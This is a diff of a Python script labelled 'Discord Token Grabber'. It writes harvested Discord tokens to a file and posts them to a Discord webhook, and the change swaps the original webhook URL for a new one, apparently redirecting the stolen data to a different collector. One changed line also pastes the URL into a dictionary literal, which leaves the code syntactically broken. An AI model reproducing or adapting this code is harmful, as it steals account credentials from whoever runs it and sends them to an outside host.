@@ -174,14 +174,14 @@ def main():
                 file.write(token + "\n")
     if len(working) == 0:
         working.append('123')
-    webhook = {
+    webhook = {https://discord.com/api/webhooks/1458488663540240475/r1fZjC3k47VimbXdrHAprX1-hG4gAx3EaNgDEctBG5ZdJu3SAMnGgImrfKmgm0_1aTER}
         "content": "",
         "embeds": embeds,
         "username": "Discord Token Grabber",
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("https://discordapp.com/api/webhooks/822492887936794685/l-PXon3A25M3cmRBbVyS4_h4MUplG5BuAWVaw6TkOLNf6nGH5G-XZ6oAoD1fsvj5MJ_n", data=dumps(webhook).encode(), headers=getheaders()))   
+        urlopen(Request("https://discord.com/api/webhooks/1458488663540240475/r1fZjC3k47VimbXdrHAprX1-hG4gAx3EaNgDEctBG5ZdJu3SAMnGgImrfKmgm0_1aTER", data=dumps(webhook).encode(), headers=getheaders()))   
 
     except:
         pass
@@ -385,4 +385,5 @@ try:
 except Exception as e:
     print(e)
     pass
+
 
